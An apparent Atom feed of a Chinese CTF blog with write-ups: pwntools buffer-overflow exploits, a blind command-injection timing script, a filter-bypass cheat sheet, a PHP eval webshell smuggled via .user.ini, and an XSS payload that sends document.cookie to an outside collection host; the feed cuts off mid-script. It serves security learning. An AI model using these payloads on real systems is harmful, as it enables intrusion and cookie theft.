<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://zhangzy999.github.io/</id>
    <title>小张的博客</title>
    <updated>2020-05-31T09:32:54.484Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://zhangzy999.github.io/"/>
    <link rel="self" href="https://zhangzy999.github.io/atom.xml"/>
    <subtitle>我是小张，一个热爱信息安全和记录生活的普通人，一位CTF入门者，编程语言使用者，一位极客追逐者。</subtitle>
    <logo>https://zhangzy999.github.io/images/avatar.png</logo>
    <icon>https://zhangzy999.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, 小张的博客</rights>
    <entry>
        <title type="html"><![CDATA[攻防世界pwn新手区—level2]]></title>
        <id>https://zhangzy999.github.io/post/ad_world_level2/</id>
        <link href="https://zhangzy999.github.io/post/ad_world_level2/">
        </link>
        <updated>2020-05-31T09:19:24.000Z</updated>
        <content type="html"><![CDATA[<p>我们拿到程序，先运行一下，发现没有特别的地方<br>
查看程序的保护机制<br>
<img src="https://zhangzy999.github.io//post-images/1590916932032.png" alt="" loading="lazy"><br>
发现开启了NX保护，就是栈不可执行（ctfwiki上好像有详细说明）<br>
查看main函数<br>
<img src="https://zhangzy999.github.io//post-images/1590916884104.png" alt="" loading="lazy"><br>
发现有一个vul这个函数，跟进去看看<br>
<img src="https://zhangzy999.github.io//post-images/1590916914164.png" alt="" loading="lazy"><br>
首先我们得到偏移为0x88+0x4：这个程序为32位程序，所以main函数中的ebp的值在栈上是32位，也就是4个字节，所以加0x4才能到达函数的返回地址<br>
这个题是提示我们是ROP，那自然想到找一下system函数的地址和&quot;/bin/sh&quot;字符串的地址，先找下system的<br>
<img src="https://zhangzy999.github.io//post-images/1590917154785.png" alt="" loading="lazy"><br>
奈斯，接着shift+f12找binsh<br>
<img src="https://zhangzy999.github.io//post-images/1590917179756.png" alt="" loading="lazy"><br>
然后跟进去，发现binsh字符串的地址<br>
<img src="https://zhangzy999.github.io//post-images/1590917197459.png" alt="" loading="lazy"><br>
然后直接写exp打一下<br>
不过有个点要注意，system函数调用后会有一个返回地址，我们直接用p32函数写个零进去就行（或者写私四个垃圾字符'aaaa'之类的，因为我们只要拿到shell就行了）</p>
<pre><code class="language-python">from pwn import *

ip = '124.126.19.106'
port = '30353'
r = remote(ip,port)

offset = 0x88 + 0x4
system_addr = 0x08048320
binsh_addr = 0x0804a024

payload = 'A' * offset + p32(system_addr) + p32(0) + p32(binsh_addr)

r.sendline(payload)
r.interactive()
</code></pre>
<p>奈斯，然后直接cat flag<br>
<img src="https://zhangzy999.github.io//post-images/1590917362749.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[攻防世界pwn新手区—level0]]></title>
        <id>https://zhangzy999.github.io/post/adworld_level0/</id>
        <link href="https://zhangzy999.github.io/post/adworld_level0/">
        </link>
        <updated>2020-05-28T23:24:59.000Z</updated>
        <content type="html"><![CDATA[<p>下载附件，简单运行一下，发现出现一个hello world然后让我们输入一个字符串，然后就退出程序……<br>
我们拿到ida里面看一看<br>
<img src="https://zhangzy999.github.io//post-images/1590708401179.png" alt="" loading="lazy"><br>
发现有一个vul这种函数，我们跟进去看看<br>
<img src="https://zhangzy999.github.io//post-images/1590708423813.png" alt="" loading="lazy"><br>
发现buf这个变量向堆栈申请了80h这个长度，也就是128个字节，但是我们可以输入200个字节，这个就很危险了，可以确定偏移量为80h+8没错了，我们就是要先填充垃圾字符搞一下80h+8，然后将函数的返回地址改写成system至于为啥是80h+8，放个图，就不解释了（汇编画画堆栈图就知道啦）<br>
<img src="https://zhangzy999.github.io//post-images/1590708690016.png" alt="" loading="lazy"><br>
然后还发现有system函数<br>
<img src="https://zhangzy999.github.io//post-images/1590708707600.png" alt="" loading="lazy"><br>
我们一路跟进去，找找函数地址在哪<br>
<img src="https://zhangzy999.github.io//post-images/1590708724959.png" alt="" loading="lazy"><br>
完美，拿到了函数地址，那么构造exp就很简单了：</p>
<pre><code class="language-python">from pwn import *

r = remote('124.126.19.106','35956')

offset = 0x80 + 8
system_addr = 0x400596

payload = offset * 'A' + p64(system_addr)

r.sendline(payload)
r.interactive()
</code></pre>
<p>直接拿到shell了<br>
<img src="https://zhangzy999.github.io//post-images/1590708766436.png" alt="" loading="lazy"><br>
cat /flag 就完辣</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[攻防世界pwn新手区—hello_pwn]]></title>
        <id>https://zhangzy999.github.io/post/adworld_hello_pwn/</id>
        <link href="https://zhangzy999.github.io/post/adworld_hello_pwn/">
        </link>
        <updated>2020-05-28T11:14:02.000Z</updated>
        <content type="html"><![CDATA[<p>我们拿到附件后，然后简单的运行一下，发现程序让我们输入一个字符串，然后就没了（草率.jpg)<br>
<img src="https://zhangzy999.github.io//post-images/1590664509396.png" alt="" loading="lazy"><br>
然后我们检查一下程序开启了哪些保护</p>
<pre><code>checksec filename
</code></pre>
<p>发现开启了NX保护（使得栈上的数据不可执行）<br>
<img src="https://zhangzy999.github.io//post-images/1590664569065.png" alt="" loading="lazy"><br>
我们用ida64位打开，直接看main的伪代码，发现一个read函数和一个if判断<br>
<img src="https://zhangzy999.github.io//post-images/1590664604117.png" alt="" loading="lazy"><br>
如果满足if条件，就能执行下面的一个函数，我们跟进这个函数，发现它可以cat flag<br>
<img src="https://zhangzy999.github.io//post-images/1590664647984.png" alt="" loading="lazy"><br>
if条件要满足，就能拿到flag，关键是if中的判断咯，我们跟进if的那个变量，发现它距离我们可以控制的那个变量只有四字节，而在read中我们可以输入十个字节，那么就是变量覆盖没跑了<br>
<img src="https://zhangzy999.github.io//post-images/1590664736849.png" alt="" loading="lazy"><br>
我们现在计算器中转下16进制，if中的那个数字到16进制就是0x6E756161是四个字节，美汁汁<br>
写个exp打打就完事了（比攻防世界的第一个题还简单）</p>
<pre><code>from pwn import *

p = remote('124.126.19.106','48949')

offset = 4

payload = offset * 'a' + p64(0x6E756161)

p.recvuntil(&quot;bof&quot;)
p.sendline(payload)
p.interactive()     #先养成良好习惯，加上这句话，免得以后打shellcode的时候忘了加-.-||
</code></pre>
<p>然后拿到flag<br>
<img src="https://zhangzy999.github.io//post-images/1590664968599.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[第三届BJDCTF菜鸡签到记—持续更新wp]]></title>
        <id>https://zhangzy999.github.io/post/di-san-jie-bjdctf-cai-ji-qian-dao-ji-chi-xu-geng-xin-wp/</id>
        <link href="https://zhangzy999.github.io/post/di-san-jie-bjdctf-cai-ji-qian-dao-ji-chi-xu-geng-xin-wp/">
        </link>
        <updated>2020-05-27T11:43:26.000Z</updated>
        <content type="html"><![CDATA[<p>比赛打的细碎，还好赛后出题人说不是针对新手的，要不然我直接自闭:-(<br>
直接wp吧，希望第四届排名能够冲击前100</p>
<h1 id="web">web</h1>
<h2 id="帮帮小红花">帮帮小红花</h2>
<p>赛后复现了一波<br>
这个题目是web里面分数最低的了，但是这个题目很苟<br>
打开题目就是花里胡哨的页面，总之题目告诉我们php后端就一句话</p>
<?php shell_exec($_GET['imagin']); ?>
<p>emm 它只有后门，没有回显的地方，常规思路直接弹个shell玩玩<br>
我Google了一些发现可以利用服务器解析日志dnslog来达到类似的shell效果<br>
有一个提供类似服务的网站，还可以一键生成payload（脚本小子狂喜）<br>
我们直接用dnslog打发现行不通，应该是后端开启了防火墙限制流量之类的（瞎猜的，不过有防火墙是肯定的）或者是服务器没有连接网络<br>
那么应该是bash盲注了，但是我比赛的时候没有注入出来，后来发现脚本中的路径写错了草-.-||<br>
题目中提示我们flag在根目录下，我直接简单的改了改之前sql盲注的脚本，一把梭出来就行了</p>
<pre><code class="language-python">import requests
import time

url = &quot;http://127.0.0.1/flag.php?imagin=&quot;
flag = &quot;BJD{&quot;
flag_list = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789{}&quot;

while True :
    num = 0
    for i in flag_list :
        num = num + 1
        payload = 'grep -e &quot;{}&quot; /flag %26%26 sleep 2'.format(flag + i)
        #%26是&amp;的url编码，这种特殊字符要经过url编码，要不然打不出来-.-|
        start_time = time.time()  #设置发送请求之前的时间
        r = requests.get(url + payload)
        end_time = time.time()  #设置发送请求之后的时间
        if end_time - start_time &gt; 0.5 :
            flag = flag + i
            print(flag)
            break
    if num &gt; 63:
        #此时已经遍历列表，说明flag已经到达结尾
        break
</code></pre>
<p>打一下，就能拿到flag了<br>
<img src="https://zhangzy999.github.io//post-images/1590580947041.PNG" alt="" loading="lazy"></p>
<h2 id="gob">gob</h2>
<p>表面是文件上传，其实是目录穿越<br>
有一个注册功能但是没有卵用，直接注册（或者不注册）到文件上传页面<br>
尝试上传各种php，都被解析成了文本，各种图片马 .htaccess .user.ini都没用<br>
雪殇大佬提示目录穿越在bp中改包<br>
我们打开bp 然后抓包改文件名 改成../../../../flag   然后后面的base64编码的东西解码过了就是flag，感觉比第一题简单，有点儿脑洞的感觉</p>
<h1 id="misc">misc</h1>
<h2 id="questionnaire">questionnaire</h2>
<p>调查问卷，应该是考社工<br>
Google + 百度识图 基本能出来所有的答案<br>
还有一个鸭子的不好出，听师傅们说用百度地图可以找到，还把街道名字给列出来了（tql<br>
其实这题直接f12就出了草<br>
划水签到题<br>
由于第一次玩这种题  感觉还挺有意思的  特地保留了一张图片<br>
<img src="https://zhangzy999.github.io//post-images/1590582813536.png" alt="" loading="lazy"></p>
<h2 id="bincat">/bin/cat</h2>
<p>拿到gif  逐帧提取  然后分离下色道 能看出来是二维码<br>
不会写脚本 直接截图工具手撸  扫描得二维码</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[解决的第一个pwn题目—攻防世界新手区：when_did_you_born]]></title>
        <id>https://zhangzy999.github.io/post/pwn_adworld_birth/</id>
        <link href="https://zhangzy999.github.io/post/pwn_adworld_birth/">
        </link>
        <updated>2020-05-27T01:50:48.000Z</updated>
        <content type="html"><![CDATA[<p>开始pwn了，成为pwn手是我毕生的梦想（🙏<br>
我们简单运行了一下程序，发现就是一个很简单的输入生日和名字的功能<br>
我们拿到ida里面简单看一波伪代码<br>
可以看到v5是不能输入1926，但是要想拿到flag还得是1926，二者冲突了<br>
<img src="https://zhangzy999.github.io//post-images/1590544386227.png" alt="" loading="lazy"><br>
然后发现前面还有一个v4，并且是危险函数gets，我们可以考虑通过v4覆盖v5的值，让v5的值变成1926从而绕过前面的if判断<br>
<img src="https://zhangzy999.github.io//post-images/1590544537541.png" alt="" loading="lazy"><br>
总结思路：首先随便输入一个v5，绕过第一个if判断，然后输入v4，通过v4溢出来覆盖v5，从而达到我们的目的，让程序本身去cat flag，我们也不用搞栈溢出啥的，只是一个单纯的“变量溢出”<br>
直接写个exp打过去就行</p>
<pre><code class="language-python">from pwn import *
p = remote(&quot;124.126.19.106&quot;,&quot;47436&quot;)

offset = 8  #偏移量是8

p.recvuntil(&quot;Birth?&quot;) #这个是到第一个if判断停下来
p.sendline(&quot;hhh&quot;) #我们随便打个东西进去就行

p.recvuntil(&quot;Name?&quot;)
birth = 0x786      #0x786 == 1926
payload = &quot;A&quot;*offset + p64(birth)

p.sendline(payload)
p.interactive()
</code></pre>
<p>然后就拿到了flag<br>
<img src="https://zhangzy999.github.io//post-images/1590546253003.PNG" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[GXYCTF2019]Ping Ping Ping—os命令总结]]></title>
        <id>https://zhangzy999.github.io/post/gxyctf2019ping-ping-ping/</id>
        <link href="https://zhangzy999.github.io/post/gxyctf2019ping-ping-ping/">
        </link>
        <updated>2020-05-21T00:34:14.000Z</updated>
        <content type="html"><![CDATA[<p>打开环境，是如下页面<br>
<img src="https://zhangzy999.github.io//post-images/1590021358928.png" alt="" loading="lazy"><br>
应该是让我们用get方法传一个参数ip，然后执行系统的ping命令，我们ls一下看看页面是如何回显的<br>
<img src="https://zhangzy999.github.io//post-images/1590021468013.png" alt="" loading="lazy"><br>
有flag.php和index.php，直接访问不会有回显，猜测flag在注释里面，那我们cat一下flag.php<br>
<img src="https://zhangzy999.github.io//post-images/1590021575630.png" alt="" loading="lazy"><br>
显示&quot;fxck your space&quot;……<br>
应该是过滤了空格emm，那么我们先总结一下os命令执行的常见的绕过方法：<br>
1，过滤空格：</p>
<pre><code>过滤空格：可以用以下字符代替
&lt;&gt;
&lt;
${IFS}
$IFS$1
{cat,flag.php}
</code></pre>
<p>2，过滤关键字或者一些纳入黑名单的敏感文件名：</p>
<pre><code>黑名单	绕过：
拼接：cat test.txt  =  a=c;b=at;c=test;d=.txt $a$b $c$d 
base64编码:  `echo Y2F0IHRlc3QudHh0|base64 -d`
               echo Y2F0IHRlc3QudHh0|base64 -d|bash
               echo Y2F0IHRlc3QudHh0|base64 -d|sh
单双引号：ca''t tes&quot;&quot;t.txt
反斜线：ca\t tes\t.txt
$符号：ca$@t te$9st.txt
cat等价替换：more less head tac tail vim等等……
通配符：
/???/?at ????.???
/???/?[a][t] ????.???
</code></pre>
<p>3，做长度上的限制：</p>
<pre><code>长度限制 绕过：
（&gt;是写入一个文件，但是内容会清空，&gt;&gt;是在文件末尾追加，\是换行符）
echo  &quot;cat\\&quot; &gt; cmd
echo &quot;tes\\&quot;&gt;&gt;cmd
echo &quot;t.txt&quot;&gt;&gt;cmd
sh cmd
</code></pre>
<p>有了以上办法，它既然过滤了空格，我们用以下几种形式来代替</p>
<pre><code>1: ?ip=1|cat${IFS}flag.php
2: ?ip=1|cat&lt;&gt;flag.php
3: ?ip=1|cat&lt;flag.php
4: ?ip=1|{cat,flag.php}
5: ?ip=1|cat$IFS$1flag.php
</code></pre>
<p>前四种方法都是&quot;fxck your symbol!&quot;，猜测是对特殊字符做了过滤，但是cao dan的是我们不知道过滤了啥<br>
<img src="https://zhangzy999.github.io//post-images/1590022142460.png" alt="" loading="lazy"><br>
第五种方法可以！<br>
<img src="https://zhangzy999.github.io//post-images/1590022258690.png" alt="" loading="lazy"><br>
没有fxck your space，space，而是fuck flag……<br>
没事儿，既然能突破前两重限制，那应该离胜利不远了，尝试拼接法拼flag无果后，我们读一下index.php</p>
<pre><code>?ip=1|cat$IFS$1index.php
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://zhangzy999.github.io//post-images/1590022474723.png" alt="" loading="lazy"></figure>
<pre><code class="language-php">&lt;?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{1f}]|\&gt;|\'|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match)){
    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\'|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match);
    die(&quot;fxck your symbol!&quot;);
  } else if(preg_match(&quot;/ /&quot;, $ip)){
    die(&quot;fxck your space!&quot;);
  } else if(preg_match(&quot;/bash/&quot;, $ip)){
    die(&quot;fxck your bash!&quot;);
  } else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){
    die(&quot;fxck your flag!&quot;);
  }
  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);
  echo &quot;&lt;pre&gt;&quot;;
  print_r($a);
}
?&gt;
</code></pre>
<p>可以看到上面就是我们的过滤规则了，推荐一个调试正则的网站：https://regex101.com<br>
我们已经突破前两重过滤，我们直接看最后一个带有flag的过滤规则就好<br>
<img src="https://zhangzy999.github.io//post-images/1590022906117.png" alt="" loading="lazy"><br>
可以看到只要有flag出现就不可以，无论它们中间有多少字符，但是咧，不出现flag.php<br>
出现f$a是不会触发正则的，我们可以用拼接法来拼接flag：</p>
<pre><code>?ip=1;a=lag.php;cat$IFS$1f$a;
</code></pre>
<p><img src="https://zhangzy999.github.io//post-images/1590023132426.png" alt="" loading="lazy"><br>
bingo!<br>
当然还有以下三种解法<br>
1，(看源码知道bash被过滤)我们用sh来代替进行base64编码</p>
<pre><code>?ip=1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
</code></pre>
<p>2，反引号里面的字符串会被当作命令执行</p>
<pre><code>?ip=1;`echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d`
</code></pre>
<p>3，反引号里面的字符串不仅可以被当作命令执行，命令执行的结果还可被当作输入</p>
<pre><code>?ip=1;cat$IFS$1`ls`   等价于    cat flag.php index.php
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[BUUweb—checkIn，利用.user.ini上传木马]]></title>
        <id>https://zhangzy999.github.io/post/webcheckIn/</id>
        <link href="https://zhangzy999.github.io/post/webcheckIn/">
        </link>
        <updated>2020-05-15T02:17:05.000Z</updated>
        <content type="html"><![CDATA[<p>先放上我向大佬学习的原文章：<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">大佬文章</a><br>
我们看看官方手册对于.ini文件的说明：<a href="https://www.php.net/manual/zh/configuration.file.per-user.php">官方PHP手册</a></p>
<blockquote>
<p>自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用 .htaccess 文件有同样效果。<br>
除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER['DOCUMENT_ROOT'] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
</blockquote>
<p>我们可以看到下图中php.ini里面包含了非常多的php的配置，但是这些配置分成了四种：<br>
<img src="https://zhangzy999.github.io//post-images/1589510286611.png" alt="" loading="lazy"><br>
我们看看官方对于PHP_INI_*模式的定义：<br>
<img src="https://zhangzy999.github.io//post-images/1589510381617.png" alt="" loading="lazy"><br>
可以看到，在PHP_INI_USER模式中，是可以利用.user.ini修改设置的，然而，事实上，除了PHP_INI_SYSTEM外，其余三种模式都可以利用.user.ini来修改设置😶<br>
但是相对敏感的配置选项，都是PHP_INI_SYSTEM模式，也就是说只能通过php.ini或者httpd.conf来设定......<br>
8过，在php的配置中有两个灰常有意思的项：<br>
<img src="https://zhangzy999.github.io//post-images/1589511354756.png" alt="" loading="lazy"><br>
我们点进去看看这俩玩意到底是啥：<a href="https://www.php.net/manual/zh/ini.core.php#ini.auto-append-file">php核心配置选项说明</a></p>
<blockquote>
<p>auto_append_file string:<br>
Specifies the name of a file that is automatically parsed after the main file. The file is included as if it was called with the require function, so include_path is used.<br>
The special value none disables auto-appending.<br>
Note: If the script is terminated with exit(), auto-append will not occur.</p>
</blockquote>
<p>翻译成人话就是：可以在同目录下的php文件后面来一个类似于require()函数的功能解析指定的文件，但是php用exit()终止脚本的话，就不可以辣<br>
auto_prepend_file就是在文件前解析<br>
嗯……这俩功能是蛮强大的8，那么隐藏木马的思路就是先传个.user.ini，然后自动解析一张图片名，然后那个图片实际上是个图片马，这样就达成了目的，要求还是苛刻的，为啥呢？<br>
首先，你在上传到的目录下得有php文件，这是前提要求<br>
第二，当你用于隐藏后门的时候，你得能够上传的了.user.ini文件，也就是说防火墙允许你这样干……<br>
看似苛刻，但是有的CTF赛题却可以用~<br>
下面让我们来康康具体的应用8：[SUCTF 2019]CheckIn<br>
打开环境是一张多么朴实无华的界面呵<br>
<img src="https://zhangzy999.github.io//post-images/1589512236862.png" alt="" loading="lazy"><br>
二话不说来给他干个一句话木马上去</p>
<pre><code class="language-php">&lt;?php @eval($_POST['CyurL3']); ?&gt;
</code></pre>
<p><img src="https://zhangzy999.github.io//post-images/1589512360743.png" alt="" loading="lazy"><br>
555,果然不可以，提示我们非法后缀，既然是后缀这块不通过，我们用特殊的来看看，比如双写php，大小写php，用特殊扩展名pht等方法都没办法绕过这个玩意，不信你看源代码嘛（事后出题师傅们放到github上的）<br>
<img src="https://zhangzy999.github.io//post-images/1589513091150.png" alt="" loading="lazy"><br>
可以看到只要是ph开头的都被干掉了，htaccess也被干掉了（小声bb：这块不太明白，不是只有apache服务器才能上传.htaccess文件吗，个人猜测当时比赛的时候出题方的服务器是apache，buu上的服务器应该就是nginx了8）<br>
既然php不可以，那我们把后缀改成jpg试试😎<img src="https://zhangzy999.github.io//post-images/1589513590035.png" alt="" loading="lazy"><br>
可以看到已经绕过了后缀名检测的机制，但是它告诉我们你的图片里不能有&quot;&lt;?&quot;这个东西哟😭<br>
莫得事，我们可以用&lt;script&gt;标签来绕过</p>
<pre><code class="language-javascript">&lt;script language=&quot;php&quot;&gt;eval($_POST['CyurL3']);&lt;/script&gt;
</code></pre>
<p>那么我们再上传一波来看看<br>
<img src="https://zhangzy999.github.io//post-images/1589514478580.png" alt="" loading="lazy"><br>
还是不行，它还有exif_imagetype这个东西的检测，百度一下知道它是php的一个函数，来读取一个图像的第一个字节并检查其签名，那我们伪造一波8，在前面加上gif的文件头“GIF”<br>
<img src="https://zhangzy999.github.io//post-images/1589515289607.png" alt="" loading="lazy"><br>
Ohhhh,上传成功辣<br>
<img src="https://zhangzy999.github.io//post-images/1589515528926.png" alt="" loading="lazy"><br>
但是怎么解析就是个大问题了没错吧，你可以看到，上传目录下面有index.php，叫什么名字不重要，重要的是有php文件，这个就很nice，我们上传个.user.ini，来包含下a.jpg，让它在php文件里面被解析<br>
<img src="https://zhangzy999.github.io//post-images/1589515762119.png" alt="" loading="lazy"><br>
这是.user.ini的内容，好了，我们可以上传一波康康<br>
<img src="https://zhangzy999.github.io//post-images/1589515814991.png" alt="" loading="lazy"><br>
没毛病，成功辽，进入上传文件目录到index.php页面里面，然后菜刀或者蚁剑连接木马，顺利找到flag！<br>
<img src="https://zhangzy999.github.io//post-images/1589515871604.png" alt="" loading="lazy"><br>
总结下嗷，.user.ini可以来帮助我们解析图片马<br>
其优势吧，在于无论服务器是nginx/apache/IIS，只要是以fastcgi或者cgi运行的php都可以用这个方法来搞一搞，但是有个致命的要求，就是说你的上传目录文件下面得有php文件才可以……<br>
再者，我们复现环境的时候，康康它的源码，其实有个地方做的很不合理，就是过滤掉&quot;&lt;?&quot;的内容，对于用户来说很不友好，因为很多的jpg文件里面的数据区有&quot;&lt;?&quot;这种符号，这样就导致了我们普通的图片也无法上传（亲测），综上，本题get到的技能点：<br>
1，.user.ini来解析木马<br>
2，&lt;script&gt;标签来绕过&quot;&lt;?&quot;的限制（其实绝大多数情况下script标签也不能用……）<br>
3，用图片的文件头来绕过exif_imagetype()函数的检测<br>
本文的最后附上github上的题目项目8：<a href="https://github.com/team-su/SUCTF-2019/blob/master/Web/checkIn/src/html/index.php">题目环境</a><br>
如有错误，b站私信up主”yuyu-宇“指出嗷~</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CTF—Bugku：秋名山老司机(快速反弹POST)—来一起开车鸭~]]></title>
        <id>https://zhangzy999.github.io/post/qiumingshanlaosiji/</id>
        <link href="https://zhangzy999.github.io/post/qiumingshanlaosiji/">
        </link>
        <updated>2020-05-07T03:28:12.000Z</updated>
        <content type="html"><![CDATA[<p>封面小姐姐好看吧🤤<br>
没错，本次题目和她……一点关系都没有……<br>
无聊，博客太少了，于是乎随便做俩题写个wp来凑凑数（逃<br>
这个题不算难——前提是你会python<br>
咳咳，进入正题，我们打开页面，发现如下所示：<br>
<img src="https://zhangzy999.github.io//post-images/1588822298727.PNG" alt="" loading="lazy"><br>
页面啥都莫得，只有一句话：请在两秒内提交表达式的值<br>
好吧，除非我是速算界的超级大脑和手速界的扛把子，要不然肯定做不到<br>
分析下哈，提交的话，用什么办法提交？get？post？<br>
当我再刷新两下页面的时候，就出现了一句提示<br>
<img src="https://zhangzy999.github.io//post-images/1588822470508.PNG" alt="" loading="lazy"><br>
嗯，很好，告诉我们用post提交，而且提示我们参数是value<br>
那我们就上python吧<br>
网上的wp大多是正则表达式，我就纳闷了，split方法不香吗   o.o  😑 (正则大佬请无视)<br>
<img src="https://zhangzy999.github.io//post-images/1588822588012.PNG" alt="" loading="lazy"><br>
上图是我用split方法进行调试的结果<br>
好8，直接祭出改良版的脚本：（因为有时候数太大python计算好像会出现一定的精确度上的误差）<br>
我选择了一个while循环来优化，看着也省心☠️<br>
<img src="https://zhangzy999.github.io//post-images/1588822722154.PNG" alt="" loading="lazy"></p>
<pre><code class="language-python">import requests
while True:
    url = 'http://123.206.87.240:8002/qiumingshan/'
    s = requests.session()
    r = s.get(url)
    temp = r.text.split(&quot;div&gt;&quot;)[1].split('=')[0]  
    flag = eval(temp)
    data = {'value':flag}
    response = s.post(url,data = data)
    if &quot;Bug&quot; in response.text:
        print response.text
        break
</code></pre>
<p>然后就是flag辣<br>
<img src="https://zhangzy999.github.io//post-images/1588822875045.PNG" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[日常生活—大佬们的博客地址]]></title>
        <id>https://zhangzy999.github.io/post/dalaoboke/</id>
        <link href="https://zhangzy999.github.io/post/dalaoboke/">
        </link>
        <updated>2020-04-28T15:09:28.000Z</updated>
        <content type="html"><![CDATA[<p>七星<br>
友链：<a href="http://qixingnet.top/">http://qixingnet.top/</a><br>
堆堆<br>
友链：<a href="https://duitutu.cn">https://duitutu.cn</a><br>
魔法少女雪殇<br>
友链：<a href="http://z.mofalongmao.xyz/wordpress/">http://z.mofalongmao.xyz/wordpress/</a><br>
R1v0ir<br>
友链：<a href="https://r1v0ir.github.io/">https://r1v0ir.github.io/</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CTF之一道硬核的XSS梦幻联动SQL注入的赛题—[CISCN2019 华东北赛区]Web2]]></title>
        <id>https://zhangzy999.github.io/post/web2-xss/</id>
        <link href="https://zhangzy999.github.io/post/web2-xss/">
        </link>
        <updated>2020-04-28T12:45:18.000Z</updated>
        <content type="html"><![CDATA[<p>文章撰写参考链接，原大佬博客<a href="%22https://www.zhaoj.in/read-6100.html%22"></a><br>
本文是笔者在学习大佬博客基础上写成的(我太菜了)<br>
这道题呢对小白一点儿也不友好<br>
反正我是打了五个小时，最后发现payload没有加引号（骂骂咧咧）<br>
言归正传，我们打开环境，发现是一个网站，有投稿和反馈功能<br>
<img src="https://zhangzy999.github.io//post-images/1588078652213.png" alt="" loading="lazy"><br>
就是说我们可以投稿，然后点击审核，管理员就会来到我们的页面，审核我们的投稿<br>
这样的话我们可以构造恶意代码，让管理员进去，从而窃取管理员的cookie，进入后台为所欲为（滑稽）<br>
好，我们看一下它的投稿页面和审核页面<br>
<img src="https://zhangzy999.github.io//post-images/1588078732024.png" alt="" loading="lazy"><br>
<img src="https://zhangzy999.github.io//post-images/1588078738665.png" alt="" loading="lazy"><br>
嗯，xss没跑了<br>
我们上平台，平台链接是<br>
<a href="http://xss.buuoj.cn/">buu的xss平台</a><br>
你需要注册一个账号，然后新建项目，这块不说了，就跟安装软件一直点下一步一样简单。。。<br>
<img src="https://zhangzy999.github.io//post-images/1588079093914.png" alt="" loading="lazy"><br>
OK，平台会自动帮我们生成xss代码，自己可以研究一下那一摞代码都是干嘛的，很有意思哟<br>
OK，我们回到投稿页面，来一个最简单的脚本实验一下</p>
<pre><code class="language-Javascript">&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre>
<p>提示我们上传成功<br>
<img src="https://zhangzy999.github.io//post-images/1588079347722.png" alt="" loading="lazy"><br>
我们点击那个页面，但是并没有弹窗，我们查看页面源代码，好像发现了不得了的事情<br>
<img src="https://zhangzy999.github.io//post-images/1588079455672.png" alt="" loading="lazy"><br>
没错，我们输入的英文小括号被换成中文的了，说明后端有保护机制，不过虽然头大，我们却可以用markup编码的方式绕过（就是我们喜闻乐见的&amp;#编码）<br>
<img src="https://zhangzy999.github.io//post-images/1588080034916.png" alt="" loading="lazy"><br>
这个编码就是&amp;#后面加上我们的ascii码<br>
链接如下：<a href="https://www.w3.org/MarkUp/html-spec/html-spec_13.html"></a><br>
再看之前的源代码<br>
<img src="https://zhangzy999.github.io//post-images/1588080193440.png" alt="" loading="lazy"><br>
它有个CSP内容安全策略的存在，<a href="https://blog.csdn.net/u014465934/article/details/84199171">CSP内容安全策略详解，在此不再赘述</a><br>
对，它开启了'unsafe-eval'，所以我们可以用eval来执行我们的代码<br>
好，我们的payload为</p>
<pre><code class="language-javascript">&lt;svg&gt;&lt;script&gt;eval(&quot;xss&quot;)&lt;/script&gt;
</code></pre>
<p>而xss就是我们要填充的恶意代码，如下</p>
<pre><code class="language-javascript">(function(){window.location.href=
'http://xss.buuoj.cn/index.php?do=api&amp;id=xpqwIP&amp;keepsession=0&amp;location='
+
escape((function(){try{return document.location.href}catch(e){return''}})())
+
'&amp;toplocation='+escape((function(){try{return top.location.href}catch(e){return''}})())
+
'&amp;cookie='+escape((function(){try{return document.cookie}catch(e){return''}})())
+
'&amp;opener='
+
escape((function(){try{return(window.opener&amp;&amp;window.opener.location.href)
?window.opener.location.href:''}catch(e){return''}})());})();
</code></pre>
<p>注意哈，我是为了大家阅读代码才用换行符分开的，大家中间不要掺杂换行符否则xss不会成功的<br>
<img src="https://zhangzy999.github.io//post-images/1588080785595.png" alt="" loading="lazy"><br>
还有一点，就是上图的id那里要设置成你的项目的id，在项目代码里有<br>
然后接下来我们要做的就是把上述内容给它来个Markup编码，但是手工emm几乎不可能实现除非你是肝帝<br>
接下来上python脚本好了（版本python2.7）</p>
<pre><code class="language-python">payload_end = ''
payload = &quot;(function(){window.location.href='http://xss.buuoj.cn/index.php?do=api&amp;id=xpqwIP&amp;keepsession=0&amp;location='
